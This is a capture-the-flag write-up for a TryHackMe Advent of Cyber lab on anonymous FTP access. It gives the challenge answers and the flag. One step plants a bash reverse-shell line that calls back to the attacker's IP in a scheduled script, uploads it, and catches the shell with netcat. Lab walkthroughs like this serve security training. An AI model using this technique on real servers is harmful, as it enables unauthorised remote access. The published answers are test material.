# Day 9 - Anyone can be Santa!

**Date:** 10, December, 2020

**Author:** Dhilip Sanjay S

---
## FTP


## Solutions

### 1) Name the directory on the FTP server that has data accessible by the "anonymous" user
- **Answer:** public
- **Steps to reproduce:**
    - To connect to FTP server - `ftp <MACHINE IP>`.
    - Provide username as `anonymous`.
    - Type `ls` to list the directories. 
    - You'll find that only the **public** directory is accessible.
---

### 2) What script gets executed within this directory?
- **Answer:** backup.sh
---

### 3) What movie did Santa have on his Christmas shopping list?
- **Answer:** The Polar Express
- **Steps to reproduce:**
    - To download the shopping list - `get shoppinglist.txt` 
---

### 4) Re-upload this script to contain malicious data
- **Answer:** THM{even_you_can_be_santa}
- **Steps to reproduce:**
    - To download the backup.sh - `get backup.sh` 
    - Add the following script to the file: 
    ```bash
    bash -i >& /dev/tcp/Your_TryHackMe_IP/4444 0>&1
    ```
    - Reupload backup.sh - `put backup.sh`

- **Note:** You must listen to the connection using `netcat`. If you don't know know how to do it, refer Day02. After getting the reverse shell, you can `cat flag.txt` to get the flag.

---
[Back to Advent of Cyber 2](/Advent%20of%20Cyber%202) 